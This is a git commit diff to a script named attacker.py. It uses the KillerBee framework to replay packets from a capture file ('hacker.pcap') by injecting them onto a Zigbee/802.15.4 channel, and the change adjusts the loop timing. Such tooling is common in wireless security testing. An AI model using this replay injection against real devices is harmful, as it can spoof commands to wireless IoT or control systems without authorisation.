4c512879502d37e70a9576aec76644f0af986bb7
prince-7 <amanvijaykumarsingh7792@gmail.com>
2022-11-28 14:34:51 +0530

    Update

--- Tool/attacker.py
+++ Tool/attacker.py
@@ -10,10 +10,12 @@ devstring = input("Enter device id: ")
 kb = KillerBee(device=devstring)
 kb.set_channel(11)
 
+cap = PcapReader('hacker.pcap')
+
 while True:
     try:
         packet = cap.pnext()[1]
+        time.sleep(1)
         kb.inject(packet[0:-2])
-        time.sleep(0.1)
     except TypeError:
         break
